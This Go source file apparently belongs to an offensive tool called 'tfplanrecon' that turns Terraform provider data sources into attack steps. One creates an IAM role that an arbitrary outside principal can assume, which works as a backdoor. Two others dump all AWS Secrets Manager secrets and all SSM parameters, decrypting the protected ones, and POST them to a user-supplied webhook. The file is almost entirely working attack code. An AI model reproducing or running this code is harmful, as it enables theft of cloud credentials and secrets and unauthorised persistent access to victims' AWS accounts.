package techniques

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/iam"
	"github.com/aws/aws-sdk-go/service/secretsmanager"
	"github.com/aws/aws-sdk-go/service/ssm"
	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

// AwsIamRole returns the schema for AWS IAM role creation data source
func AwsIamRole() *schema.Resource {
	return &schema.Resource{
		ReadContext: awsIamRoleRead,

		Schema: map[string]*schema.Schema{
			"role_name": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The name of the IAM role to create",
			},
			"aws_principal": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "AWS principal that can assume this role (e.g., arn:aws:iam::123456789012:root, user:username, or account-id)",
			},
			"description": {
				Type:        schema.TypeString,
				Optional:    true,
				Default:     "Role created by tfplanrecon",
				Description: "Description of the IAM role",
			},
		},
	}
}

func awsIamRoleRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	roleName := d.Get("role_name").(string)
	awsPrincipal := d.Get("aws_principal").(string)
	description := d.Get("description").(string)
	
	assumeRolePolicy := generateTrustPolicy(awsPrincipal)
	
	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "TFPLANRECON AWS IAM Role Creation",
		Detail:   fmt.Sprintf("Creating IAM role: Name=%s, Principal=%s, Description=%s", roleName, awsPrincipal, description),
	})
	
	sess, err := session.NewSession(&aws.Config{
		Region: aws.String("us-east-1"),
	})
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to create AWS session: %v", err))
	}
	
	iamSvc := iam.New(sess)
	
	getRoleInput := &iam.GetRoleInput{
		RoleName: aws.String(roleName),
	}
	
	_, err = iamSvc.GetRole(getRoleInput)
	if err == nil {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "AWS IAM Role Already Exists",
			Detail:   fmt.Sprintf("Role %s already exists in AWS account", roleName),
		})
		d.SetId(roleName)
		return diags
	}
	
	createRoleInput := &iam.CreateRoleInput{
		RoleName:                 aws.String(roleName),
		AssumeRolePolicyDocument: aws.String(assumeRolePolicy),
		Description:              aws.String(description),
	}
	
	result, err := iamSvc.CreateRole(createRoleInput)
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to create IAM role: %v", err))
	}
	
	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "Successfully Created AWS IAM Role",
		Detail:   fmt.Sprintf("Created role %s with ARN: %s", roleName, *result.Role.Arn),
	})
	
	d.SetId(roleName)
	return diags
}

func generateTrustPolicy(awsPrincipal string) string {
	var principal string
	
	if strings.HasPrefix(awsPrincipal, "arn:aws:iam::") {
		principal = fmt.Sprintf(`"AWS":"%s"`, awsPrincipal)
	} else if strings.Contains(awsPrincipal, ":") {
		parts := strings.SplitN(awsPrincipal, ":", 2)
		switch parts[0] {
		case "user":
			principal = fmt.Sprintf(`"AWS":"arn:aws:iam::%s:user/%s"`, "123456789012", parts[1])
		case "role":
			principal = fmt.Sprintf(`"AWS":"arn:aws:iam::%s:role/%s"`, "123456789012", parts[1])
		default:
			principal = fmt.Sprintf(`"AWS":"arn:aws:iam::%s:root"`, awsPrincipal)
		}
	} else {
		principal = fmt.Sprintf(`"AWS":"arn:aws:iam::%s:root"`, awsPrincipal)
	}
	
	return fmt.Sprintf(`{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{%s},"Action":"sts:AssumeRole"}]}`, principal)
}

// AwsSecretsExfil returns the schema for AWS Secrets Manager exfiltration data source
func AwsSecretsExfil() *schema.Resource {
	return &schema.Resource{
		ReadContext: awsSecretsExfilRead,

		Schema: map[string]*schema.Schema{
			"region": {
				Type:        schema.TypeString,
				Optional:    true,
				Default:     "us-east-1",
				Description: "AWS region to scan for secrets",
			},
			"webhook_url": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "Optional webhook URL to send secrets to (if not provided, secrets are printed to console)",
			},
			"secret_name_filter": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "Optional filter to match secret names (supports wildcards)",
			},
		},
	}
}

// ProviderConfig represents the provider configuration
type ProviderConfig struct {
	Client *http.Client
}

func awsSecretsExfilRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	region := d.Get("region").(string)
	webhookURL := d.Get("webhook_url").(string)
	nameFilter := d.Get("secret_name_filter").(string)

	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "TFPLANRECON AWS Secrets Manager Exfiltration",
		Detail:   fmt.Sprintf("Scanning for secrets in region %s", region),
	})

	sess, err := session.NewSession(&aws.Config{
		Region: aws.String(region),
	})
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to create AWS session: %v", err))
	}

	secretsClient := secretsmanager.New(sess)
	
	// List all secrets
	listInput := &secretsmanager.ListSecretsInput{}
	if nameFilter != "" {
		listInput.Filters = []*secretsmanager.Filter{
			{
				Key:    aws.String("name"),
				Values: []*string{aws.String(nameFilter)},
			},
		}
	}

	secrets := make(map[string]string)
	
	err = secretsClient.ListSecretsPages(listInput, func(page *secretsmanager.ListSecretsOutput, lastPage bool) bool {
		for _, secret := range page.SecretList {
			secretName := *secret.Name
			
			// Get the secret value
			getInput := &secretsmanager.GetSecretValueInput{
				SecretId: aws.String(secretName),
			}
			
			result, err := secretsClient.GetSecretValue(getInput)
			if err != nil {
				// Log error but continue with other secrets
				diags = append(diags, diag.Diagnostic{
					Severity: diag.Warning,
					Summary:  fmt.Sprintf("Failed to read secret: %s", secretName),
					Detail:   fmt.Sprintf("Error: %v", err),
				})
				return true
			}
			
			if result.SecretString != nil {
				secrets[secretName] = *result.SecretString
			}
		}
		return true
	})
	
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to list secrets: %v", err))
	}

	if len(secrets) == 0 {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "No Secrets Found",
			Detail:   fmt.Sprintf("No accessible secrets found in region %s", region),
		})
		d.SetId("no-secrets")
		return diags
	}

	// Convert secrets to string for display
	var secretsList []string
	for name, value := range secrets {
		secretsList = append(secretsList, fmt.Sprintf("%s=%s", name, value))
	}
	secretsString := strings.Join(secretsList, "\n")

	if webhookURL != "" {
		// Send to webhook
		config := m.(*ProviderConfig)
		client := config.Client

		payload, err := json.Marshal(secrets)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error marshaling secrets: %s", err))
		}

		req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
		if err != nil {
			return diag.FromErr(fmt.Errorf("error creating request: %s", err))
		}

		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error sending secrets to webhook: %s", err))
		}
		defer resp.Body.Close()

		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "AWS Secrets Sent to Webhook",
			Detail:   fmt.Sprintf("Sent %d secrets to %s:\n%s", len(secrets), webhookURL, secretsString),
		})
	} else {
		// Print to console via diagnostic
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "AWS Secrets Manager Secrets Extracted",
			Detail:   fmt.Sprintf("Found %d secrets:\n%s", len(secrets), secretsString),
		})
	}

	d.SetId(fmt.Sprintf("secrets-%s-%d", region, len(secrets)))
	return diags
}

// AwsSsmParameters returns the schema for AWS SSM Parameter Store exfiltration data source
func AwsSsmParameters() *schema.Resource {
	return &schema.Resource{
		ReadContext: awsSsmParametersRead,

		Schema: map[string]*schema.Schema{
			"region": {
				Type:        schema.TypeString,
				Optional:    true,
				Default:     "us-east-1",
				Description: "AWS region to scan for parameters",
			},
			"webhook_url": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "Optional webhook URL to send parameters to (if not provided, parameters are printed to console)",
			},
			"parameter_prefix": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "Optional prefix to filter parameter names (e.g., '/app/prod/')",
			},
			"decrypt": {
				Type:        schema.TypeBool,
				Optional:    true,
				Default:     true,
				Description: "Whether to decrypt SecureString parameters",
			},
		},
	}
}

func awsSsmParametersRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	region := d.Get("region").(string)
	webhookURL := d.Get("webhook_url").(string)
	prefix := d.Get("parameter_prefix").(string)
	decrypt := d.Get("decrypt").(bool)

	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "TFPLANRECON AWS SSM Parameter Store Exfiltration",
		Detail:   fmt.Sprintf("Scanning for SSM parameters in region %s", region),
	})

	sess, err := session.NewSession(&aws.Config{
		Region: aws.String(region),
	})
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to create AWS session: %v", err))
	}

	ssmClient := ssm.New(sess)
	
	// Prepare input for GetParametersByPath
	input := &ssm.GetParametersByPathInput{
		Recursive:      aws.Bool(true),
		WithDecryption: aws.Bool(decrypt),
	}
	
	if prefix != "" {
		input.Path = aws.String(prefix)
	} else {
		input.Path = aws.String("/")
	}

	parameters := make(map[string]string)
	
	err = ssmClient.GetParametersByPathPages(input, func(page *ssm.GetParametersByPathOutput, lastPage bool) bool {
		for _, param := range page.Parameters {
			paramName := *param.Name
			
			if param.Value != nil {
				parameters[paramName] = *param.Value
			}
		}
		return true
	})
	
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to get SSM parameters: %v", err))
	}

	if len(parameters) == 0 {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "No SSM Parameters Found",
			Detail:   fmt.Sprintf("No accessible parameters found in region %s with prefix '%s'", region, prefix),
		})
		d.SetId("no-parameters")
		return diags
	}

	// Convert parameters to string for display
	var paramsList []string
	for name, value := range parameters {
		paramsList = append(paramsList, fmt.Sprintf("%s=%s", name, value))
	}
	parametersString := strings.Join(paramsList, "\n")

	if webhookURL != "" {
		// Send to webhook
		config := m.(*ProviderConfig)
		client := config.Client

		payload, err := json.Marshal(parameters)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error marshaling parameters: %s", err))
		}

		req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
		if err != nil {
			return diag.FromErr(fmt.Errorf("error creating request: %s", err))
		}

		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error sending parameters to webhook: %s", err))
		}
		defer resp.Body.Close()

		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "AWS SSM Parameters Sent to Webhook",
			Detail:   fmt.Sprintf("Sent %d parameters to %s:\n%s", len(parameters), webhookURL, parametersString),
		})
	} else {
		// Print to console via diagnostic
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "AWS SSM Parameter Store Parameters Extracted",
			Detail:   fmt.Sprintf("Found %d parameters:\n%s", len(parameters), parametersString),
		})
	}

	d.SetId(fmt.Sprintf("ssm-params-%s-%d", region, len(parameters)))
	return diags
}